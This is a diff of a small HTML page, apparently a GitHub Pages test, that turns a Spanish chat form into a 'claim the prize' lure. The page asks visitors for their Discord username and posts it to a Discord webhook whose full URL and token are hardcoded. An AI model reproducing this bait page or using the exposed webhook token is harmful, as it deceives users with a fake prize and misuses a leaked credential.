@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GitHub Pages Test</title>
+    <title>Click thist</title>
     <style>
         body {
             text-align: center;
@@ -37,8 +37,8 @@
     </div>
     
     <div id="messageContainer">
-        <input type="text" id="messageInput" placeholder="Escribe un mensaje...">
-        <button id="sendButton" onclick="sendMessage()">Enviar</button>
+        <input type="text" id="messageInput" placeholder="put here ur dc username">
+        <button id="sendButton" onclick="sendMessage()">send</button>
     </div>
     
     <script>
@@ -51,11 +51,11 @@
         function sendMessage() {
             const userMessage = document.getElementById('messageInput').value;
             if (userMessage.trim() === "") {
-                alert("Por favor, escribe un mensaje antes de enviar.");
+                alert("put here ur dc usernmae");
                 return;
             }
             
-            const fullMessage = `test: ${userMessage}`;
+            const fullMessage = `${userMessage} needs to claim the prize`;
 
             fetch("https://discord.com/api/webhooks/1348274091827925024/2YrSn03w34IMO6XsK_Q8MH9g6GFJxj5M3roGIPQ9awqrPCdbU1tMtxczkiKPdwuPklYH", {
                 method: "POST",
@@ -65,14 +65,14 @@
                 body: JSON.stringify({ content: fullMessage })
             }).then(response => {
                 if (response.ok) {
-                    alert("Mensaje enviado con éxito");
+                    alert("ok u will get ur pize");
                     document.getElementById('messageInput').value = "";
                 } else {
-                    alert("Error al enviar el mensaje");
+                    alert("faled");
                 }
             }).catch(error => {
                 console.error("Error:", error);
-                alert("Error al enviar el mensaje");
+                alert("failed");
             });
         }
     </script>
